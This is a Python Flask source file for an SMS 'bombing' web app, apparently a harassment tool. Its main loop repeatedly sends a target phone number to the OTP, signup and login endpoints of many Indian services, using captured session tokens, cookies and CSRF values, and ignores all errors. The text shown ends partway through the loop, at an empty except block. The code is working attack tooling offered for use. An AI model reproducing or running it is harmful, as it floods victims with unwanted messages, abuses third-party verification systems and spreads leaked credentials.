from flask import Flask, render_template, request, redirect, url_for, flash
import os
import sys
import random
import requests
import threading
from subprocess import call  # Kept for clear, but optional

app = Flask(__name__)
app.secret_key = 'super_secret_key'

colors = [
    '\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m',
    '\033[1;36m'
]

def clear():
    _ = call('clear' if os.name == 'posix' else 'cls')

def banner():
    os.system('''
    printf "\n\e[1;32m▀█▀ █▀ █░█ █▄░█ ▄▀█ █▀▄▀█ █\n"
    printf "░█░ ▄█ █▄█ █░▀█ █▀█ █░▀░█ █\e[0m\n"
    printf "\e[31m═══════════════════════════\e[0m\n"
    printf "\e[31m\e[1;95mB O M B I N G   W E B A P P\n"
    printf "DEVELOPED BY UTSANJAN MAITY\e[0m\n"
    printf "\e[31m═══════════════════════════\e[0m\n"
        ''')

def infinite(target, color, msgs):
    times = 0
    while True:
        # Hotstar
        try:
            headers = {
                "Host": "api.hotstar.com",
                "content-length": "51",
                "x-hs-usertoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
                "content-type": "application/json",
                "x-hs-platform": "PCTV",
                "x-country-code": "IN",
                "x-hs-device-id": "faa88f05-7432-4103-9886-7bd934f5c3a1",
                "hotstarauth": "st=1600957099~exp=1600963099~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d",
                "x-hs-appversion": "5.0.40",
                "x-request-id": "faa88f05-7432-4103-9886-7bd934f5c3a1",
                "accept": "*/*",
                "origin": "https://www.hotstar.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.hotstar.com/in/subscribe/sign-in",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8"
            }
            data = {"phone_number": target, "country_prefix": "91"}
            requests.put("https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp", headers=headers, json=data)
        except:
            pass
        times += 1

        # Altbalaji
        try:
            headers = {
                "Host": "api.cloud.altbalaji.com",
                "Connection": "keep-alive",
                "Content-Length": "86",
                "Accept": "application/json, text/plain, */*",
                "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
                "X-API-KEY": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE",
                "Content-Type": "application/json",
                "Origin": "https://www.altbalaji.com",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.altbalaji.com/user-detail?pid=NTU%3D",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
            }
            data = {"phone_number": target, "country_code": "91", "platform": "web", "exp": 1601043289127}
            requests.post("https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN", headers=headers, json=data)
        except:
            pass
        times += 1

        # Voot
        try:
            headers = {
                "Host": "us-central1-vootdev.cloudfunctions.net",
                "content-length": "59",
                "accept": "application/json, text/plain, */*",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
                "content-type": "application/json;charset=UTF-8",
                "origin": "https://www.voot.com",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.voot.com/",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8"
            }
            data = {"type": "mobile", "mobile": target, "countryCode": "+91"}
            requests.post("https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser", headers=headers, json=data)
        except:
            pass
        times += 1

        # Sonyliv
        try:
            headers = {
                "Host": "apiv2.sonyliv.com",
                "content-length": "111",
                "device_id": "5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120",
                "security_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
                "content-type": "application/json",
                "accept": "application/json, text/plain, */*",
                "session_id": "cc86326a51504133bacd3ce4f796e1cf-1600956156256",
                "x-via-device": "true",
                "app_version": "3.1.20",
                "origin": "https://www.sonyliv.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8"
            }
            data = {"channelPartnerID": "MSMIND", "mobileNumber": target, "country": "IN", "timestamp": "2020-09-24T14:03:03.505Z"}
            requests.post("https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP", headers=headers, json=data)
        except:
            pass
        times += 1

        # Medplus
        try:
            headers = {
                "Host": "mobile.medplusindia.com",
                "content-length": "238",
                "accept": "application/json, text/plain, */*",
                "save-data": "on",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://www.medplusmart.com",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8"
            }
            data = {
                "recieveUpdates": "1",
                "firstName": "Tsunami",
                "lastName": "Bomber",
                "emailId": "tsunami@gmail.com",
                "password": "U7d5iChk9ZWzrv$",
                "confirmpwd": "U7d5iChk9ZWzrv$",
                "mobileNumber": target,
                "SESSIONID": "17C83B4A90182E8DA6F4F15755A43027",
                "isCordova": "false",
                "isPhonepeSwitch": "false"
            }
            requests.post("https://mobile.medplusindia.com/mobilemvc/profile/register.mbl", headers=headers, data=data)
        except:
            pass
        times += 1

        # Apollo247
        try:
            headers = {
                "Host": "webapi.apollo247.com",
                "Connection": "keep-alive",
                "Content-Length": "292",
                "accept": "*/*",
                "Authorization": "Bearer 3d1833da7020e0602165529446587434",
                "Save-Data": "on",
                "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
                "content-type": "application/json",
                "Origin": "https://www.apollo247.com",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.apollo247.com/medicines?gclid=CjwKCAjwh7H7BRBBEiwAPXjadvKY3NSyNG-0yNkxp2qz2Jd5T0_zltNV3OnwoDFh3ECOsNImtyi1KxoCQY0QAvD_BwE",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
            }
            data = {
                "operationName": "Login",
                "variables": {"mobileNumber": "+91" + target, "loginType": "PATIENT"},
                "query": "query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\nstatus\nmessage\nloginId\n__typename\n  }\n}\n"
            }
            requests.post("https://webapi.apollo247.com/", headers=headers, json=data)
        except:
            pass
        times += 1

        # Netmeds
        try:
            headers = {
                "Host": "m.netmeds.com",
                "accept": "application/json, text/plain, */*",
                "save-data": "on",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://m.netmeds.com/customer/account/login",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8",
                "cookie": "G_ENABLED_IDPS=google; _gat_UA-63910444-1=1; cto_bundle=SX3iw19aZ0xrcWZ0TFFXN1huJTJGJTJGbklkaDl5ZnM2UmxQeHhLNDhMb3dxQ2dTSUU1VSUyRkVnU0g0dG5UODVJTzNIbVNSMFJwR2hZQVpGeDJGYVBlVG5scUIlMkJCM3lCOXBlZ21jMm1HTzNwZXMlMkZxSWk4TEM3eXNUYXhjTFBKbUdqQWM2NFhBTWFHS09EUmJMaDRGUVVHVHVGcWxaR2tRJTNEJTNE; liteprompt=disabled; bsCoId=3600942736100; _gat=1; bsUl=0; _gac_UA-63910444-1=1.1600942724.CjwKCAjwh7H7BRBBEiwAPXjadtM9O5MLH1ElhMO8FUbm9EprCPA4YXhxBk-XdN8ytuKetkzNGCI07xoCi1MQAvD_BwE; _gac_UA-63910444-1=1.1600942724.CjwKCAjwh7H7BRBBEiwAPXjadtM9O5MLH1ElhMO8FUbm9EprCPA4YXhxBk-XdN8ytuKetkzNGCI07xoCi1MQAvD_BwE; _gcl_aw=GCL.1600942724.CjwKCAjwh7H7BRBBEiwAPXjadtM9O5MLH1ElhMO8FUbm9EprCPA4YXhxBk-XdN8ytuKetkzNGCI07xoCi1MQAvD_BwE; _we_wk_gls_ss_=N4IgfgjArAxgbABgEYwJYgFylQOwC4yYQA0IMAhjqgCYDOmA2uBAjElAOwIICcIAugF9BQAA; _fbp=fb.1.1600942681371.1005200013; _gid=GA1.3.195334206.1600942680; _ga=GA1.3.1470493032.1600942680; _ALGOLIA=anonymous-14e705f0-f47c-495b-bd5d-0cfefde9056b; _gid=GA1.2.195334206.1600942680; _ga=GA1.2.1470493032.1600942680; _gcl_au=1.1.505450095.1600942677"
            }
            requests.get(f"https://m.netmeds.com/mst/rest/v1/id/details/{target}", headers=headers)
        except:
            pass
        times += 1

        # Getinstacash
        try:
            headers = {
                "Host": "getinstacash.in",
                "Connection": "keep-alive",
                "Content-Length": "30",
                "Accept": "*/*",
                "X-Requested-With": "XMLHttpRequest",
                "Save-Data": "on",
                "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": "https://getinstacash.in",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://getinstacash.in/sell/login",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9,hi;q=0.8",
                "Cookie": "webInsta=rvg3l166pmfpeh6mi6auisshc7; G_ENABLED_IDPS=google; _ga=GA1.2.1994009459.1600927837; _gid=GA1.2.2093909779.1600927837; _gat_gtag_UA_46718346_7=1; __zlcmid=10LjSWRMCN11wY9"
            }
            data = {"type": "sendOTP", "mobile": target}
            requests.post("https://getinstacash.in/sell/getData.php", headers=headers, data=data)
        except:
            pass
        times += 1

        # Fbbonline
        try:
            headers = {
                "Host": "www.fbbonline.in",
                "content-length": "432",
                "accept": "application/json, text/javascript, */*; q=0.01",
                "x-newrelic-id": "VQ8PVlFUChABV1ZRBgYCX1w=",
                "x-requested-with": "XMLHttpRequest",
                "save-data": "on",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.fbbonline.in",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.fbbonline.in/customer/account/create",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8",
                "cookie": "historyPlpPage=0; _gcl_au=1.1.282636412.1600839866; _gat=1; _gid=GA1.2.727597189.1600839866; _ga=GA1.2.1662893346.1600839866; all_store_details=null; registration_url_cookie=https%3A%2F%2Fwww.fbbonline.in%2F; _fbp=fb.1.1600839858758.1597042975; _fv=cmpnpp; _st_time=1600839856; PHPSESSID=7id6ar9g0g6ou64f5fk2ur43o4"
            }
            data = {
                "YII_CSRF_TOKEN": "6ea54179a7dc67c7ed0d6847f76d6204320976eb",
                "RegistrationForm[signup_page]": "1",
                "RegistrationForm[contact_number]": target,
                "RegistrationForm[valid_mobile]": "1",
                "RegistrationForm[email]": "tsunami@gmail.com",
                "RegistrationForm[valid_email]": "1",
                "RegistrationForm[first_name]": "hdhdhd",
                "RegistrationForm[last_name]": "bsbdb",
                "RegistrationForm[password]": "hdhdbfbfv",
                "RegistrationForm[tc_opt_in]": "on",
                "validate_otp": ""
            }
            requests.post("https://www.fbbonline.in/customer/account/GenerateOtp", headers=headers, data=data)
        except:
            pass
        times += 1

        # Grofers
        try:
            headers = {
                "Host": "grofers.com",
                "content-length": "21",
                "lon": "77.040489",
                "device_id": "a11f656b-422e-4617-953b-c350d517467d",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
                "auth_key": "57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13",
                "app_client": "consumer_web",
                "lat": "28.4465616",
                "content-type": "application/x-www-form-urlencoded",
                "save-data": "on",
                "accept": "*/*",
                "origin": "https://grofers.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://grofers.com/",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8",
                "cookie": "WZRK_S_RKR-99Z-ZK5Z=%7B%22p%22%3A1%2C%22s%22%3A1600811841%2C%22t%22%3A1600811851%7D; _hjAbsoluteSessionInProgress=0; AMP_TOKEN=%24NOT_FOUND; _fbp=fb.1.1600811840630.1070978807; WZRK_G=3d3457db8a1a410a81f4d25f4519b4cb; _hjid=c63646f5-26dc-4965-a368-890317b172cc; __insp_norec_sess=true; __insp_targlpt=T25saW5lIEdyb2NlcnkgU3RvcmU6IEJ1eSBPbmxpbmUgR3JvY2VyeSBmcm9tIEluZGlhJ3MgQmVzdCBPbmxpbmUgU3VwZXJtYXJrZXQgYXQgRGlzY291bnRlZCBSYXRlcyB8IEdyb2ZlcnM%3D; __insp_targlpu=aHR0cHM6Ly9ncm9mZXJzLmNvbS8%3D; __insp_nv=true; __insp_slim=1600811839327; __insp_wid=180455199; _sp_id.bf41=5f26198d742a39cd.1600811837.1.1600811838.1600811837.9e446193-9dfb-425a-8d54-f3cb10911df1; _sp_ses.bf41=*; _gat_UA-85989319-1=1; _gid=GA1.2.198360870.1600811837; _ga=GA1.2.1673610786.1600811837; _uetvid=34df67806c3d27bc1888eb83f66e00de; _uetsid=4f1cecd087208f7fb10835de7cdc217a; _gcl_au=1.1.339180193.1600811836; ajs_anonymous_id=%226da8b09a-af2c-4502-b48e-e45d4d124170%22; rl_user_id=%22%22; rl_anonymous_id=%22b680edd5-0ce4-42aa-89a7-0029485ae882%22; gr_1_locality=1849; gr_1_lon=76.9942133969929; gr_1_lat=28.4640810758775; __cfruid=f2d685e3947486d019ac90c6e461185090599082-1600811832; city=; gr_1_deviceId=a11f656b-422e-4617-953b-c350d517467d; __cfduid=d12d293cd955bb2c251771f7bdfd7a4f31600811832"
            }
            data = {"user_phone": target}
            requests.post("https://grofers.com/v2/accounts/", headers=headers, data=data)
        except:
            pass
        times += 1

        # Snapdeal
        try:
            headers = {
                "Host": "m.snapdeal.com",
                "content-length": "135",
                "xc": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19",
                "h2": "true",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
                "xg": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "u": "160081122259159083",
                "save-data": "on",
                "us": "",
                "accept": "*/*",
                "origin": "https://m.snapdeal.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://m.snapdeal.com/signin",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8",
                "cookie": "Megatron=!tejKI25+72c19/igV+D1bvp2mwEhFLDS2jEPe1hWDR/NntchcNQEz7ufEKCEVUbEU7NEI5FXe9wOSZ4=; G_ENABLED_IDPS=google; _fbp=fb.1.1600811239704.1459306793; cto_bundle=IHG_Xl90TENVUG1nU2xIZXZKWkE0OXlNbWZRTUpCRkJ5ZnplSnVJb2klMkZmTGZlaG0xbWd4cGhqUzluQmNZb1VWQldZWGVXeW4xTmdFSiUyRlc3VTVBOFpiU0twNzI0QXhFTkNNcUpGREM2VHdNYyUyRlF4WUpTNGVvU0djcCUyRnY3TU5ETG9hVVIyRXFNMnNNOGhzcERTZTJPb1hsQkNSdyUzRCUzRA; _gcl_aw=GCL.1600811235.CjwKCAjwwab7BRBAEiwAapqpTHxX7o8bt5ZuM--2vVptInqF-rQ4ljlxR3_Yoor3rNa3CGvYPtaNwBoCb8cQAvD_BwE; lt=utm_source%3Dearth_brand_new%7Cutm_content%3Dhomepage%7Cutm_medium%3Dbrand%2520term%2C%7Cutm_campaign%3DBrandCat%7Cref%3Dnull%7Cutm_term%3De%2Csnapdeal%7C; splash=true; alps=fix-dp; xc=eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19; xg=eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1; sd.zone=Z6; deviceos=android; u=160081122259159083; versm=v1; JSESSIONID=98E8853981613F4AFE87740D9BFCAACF; SCOUTER=z5qpdeh1b59qh2"
            }
            data = {
                "j_password": "null",
                "j_mobilenumber": target,
                "agree": "true",
                "j_confpassword": "null",
                "journey": "mobile",
                "numberEdit": "false",
                "swp": "true",
                "j_fullname": "uyuhyntuhy"
            }
            requests.post("https://m.snapdeal.com/signupCompleteAjax", headers=headers, data=data)
        except:
            pass
        times += 1

        # Zomato
        try:
            headers = {
                "Host": "www.zomato.com",
                "content-length": "80",
                "x-zomato-csrft": "a6b0c09972b2bdd30c9c1b6552caee5d",
                "save-data": "on",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
                "content-type": "application/json",
                "accept": "*/*",
                "origin": "https://www.zomato.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.zomato.com/kanpur",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8",
                "cookie": "__gads=ID=644864c877efb86f:T=1600810980:S=ALNI_MbFuORewzGHjkdv5wR9uXw2DaNI9g; AWSALBTGCORS=7twkZZpj88hXfO6mAO4KyKBIuadfJH9D4KzWMnP1ypIl0B4NcUK+P26IFtaVeI805plfknXZVPuFn4KuLU4/SRej2JOMuRjoZ3s4DVl/CjHm5DqwQ91yQC32/3Hyk19InAA6Q9uar2kXMJ555r6WGebZE5Rf7devMzsU6HeX+XSC; AWSALBTG=7twkZZpj88hXfO6mAO4KyKBIuadfJH9D4KzWMnP1ypIl0B4NcUK+P26IFtaVeI805plfknXZVPuFn4KuLU4/SRej2JOMuRjoZ3s4DVl/CjHm5DqwQ91yQC32/3Hyk19InAA6Q9uar2kXMJ555r6WGebZE5Rf7devMzsU6HeX+XSC; G_ENABLED_IDPS=google; _uetvid=781ece33e16eed33a8f5652b0bfacda4; _uetsid=a8cb8c64594c7cb5ec04b06f91b85702; _fbp=fb.1.1600810976131.1717249975; _gat_country=1; _gat_city=1; _gat_global=1; _gcl_au=1.1.1326869440.1600810973; _gid=GA1.2.2138122155.1600810973; _ga=GA1.2.826955249.1600810973; locus=%7B%22addressId%22%3A0%2C%22lat%22%3A26.4607%2C%22lng%22%3A80.3334%2C%22cityId%22%3A23%2C%22ltv%22%3A23%2C%22lty%22%3A%22city%22%2C%22fetchFromGoogle%22%3Afalse%2C%22dszId%22%3A15750%2C%22fen%22%3A%22Kanpur%22%7D; lty=city; ltv=23; ak_bmsc=AD74F883AF02F8919020E72812FA4D3F312C8DEFBD0D0000DB6F6A5F86725137~plfvE6deCz7/0ERruwvEqqvTf4yeUNe/RNLI/h3koDn0op9gXkki8a5LxIv92TOJJUo3V3A7rGM3/698nd6N3AeB+1hYMSmqq44RZHCCrsHB+9D8lGNmaiNP/ffRcZI3Ietwv9KWy0Jnhu3wV9pwtKkZs7UT/aKuREMakpqaZhOpdGAPFhDwMix/9atoj+ywH53XpMY9Cb9IlKUy1O6vMN3EbOQXgaEu+lP4ZR08+xjCA=; fbtrack=4f77e94d432d648e26273c38b002b7e3; zl=en; fbcity=23; csrf=a6b0c09972b2bdd30c9c1b6552caee5d; PHPSESSID=8071a1fa7b6f728acb522e9f022e13ae"
            }
            data = {"country_id": 1, "phone": target, "verification_type": "sms", "method": "phone"}
            requests.post("https://www.zomato.com/webroutes/auth/login", headers=headers, json=data)
        except:
            pass
        times += 1

        # Cuemath
        try:
            headers = {
                "Host": "www.cuemath.com",
                "Connection": "keep-alive",
                "Content-Length": "235",
                "Save-Data": "on",
                "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
                "Content-Type": "application/JSON",
                "Accept": "*/*",
                "Origin": "https://www.cuemath.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.cuemath.com/the-ultimate-cuemath-olympiad/partner/timesofindia/register/?intent=ultimate-olympiad",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9,hi;q=0.8",
                "Cookie": "cue_country_code=IN; utm_source=GSBRAND_cuemath_olympiad_Ad3; utm_campaign=GSBRAND_cuemath_olympiad_Ad3; utm_medium=GSBRAND_cuemath_olympiad_Ad3; referrer=https%3A%2F%2Fwww.google.com%2F; landing_page=%2Fthe-ultimate-cuemath-olympiad%2Fpartner%2Ftimesofindia%2F%3Futm_source%3DGSBRAND_cuemath_olympiad_Ad3%26utm_medium%3DGSBRAND_cuemath_olympiad_Ad3%26utm_campaign%3DGSBRAND_cuemath_olympiad_Ad3; _gcl_au=1.1.802696303.1600810324; _ga=GA1.2.1146344855.1600810324; _gid=GA1.2.60529482.1600810324; cue_gacid=1146344855.1600810324; _dc_gtm_UA-75184559-1=1; itm_source=TIMESOFINDIA_CMO_2020; itm_campaign=CMO_2020; itm_landing_page=%2Fthe-ultimate-cuemath-olympiad%2Fpartner%2Ftimesofindia%2Fregister%2F%3Fintent%3Dultimate-olympiad; itm_date=Tue%2C%2022%20Sep%202020%2021%3A32%3A09%20GMT; itm_date_ts=1600810329; AF_BANNERS_SESSION_ID=1600810330240; _uetsid=d5ec55ecfc37dfb197547077352e97e8; _uetvid=15fa494b609eef1a17920bb8c97cd177; _CEFT=Q%3D%3D%3D; _fbp=fb.1.1600810333599.642589325; datadome=.J0PY0DZeA6ODk1RODKVV1J.v8SUpwW5w7ZwhQFLv4tALMu9qr9MO9IiQgk-ZcAS6kV2fKjcTQZvEpHFjwnID~7t1WwrVCXkKUMFZDE_-x; _cer.v=842d9f66d9ecd4e30bc1d54ddc3925dc526082e2.qh2x5y.0; _cer.s=c76b97ac66b7a5061c40c2562ce00ab39fe229df%7Chttps%3A%2F%2Frp-07aca5b582432bb3f.crazyegg.com%7Cqh2x5y"
            }
            data = {"intl_mobile": {"phone": ""}, "phone": target, "email": "nsbd@dn.djs", "full_name": "hdhdhdg", "place_id": "ChIJYYhT3gl3AjoRUDlkL1i5oIk", "timezone": "Asia/Calcutta", "detail_source": "CMO_2020", "form_fields": "full_name,phone,email,place_id"}
            requests.post("https://www.cuemath.com/api/v4/parents/", headers=headers, json=data)
        except:
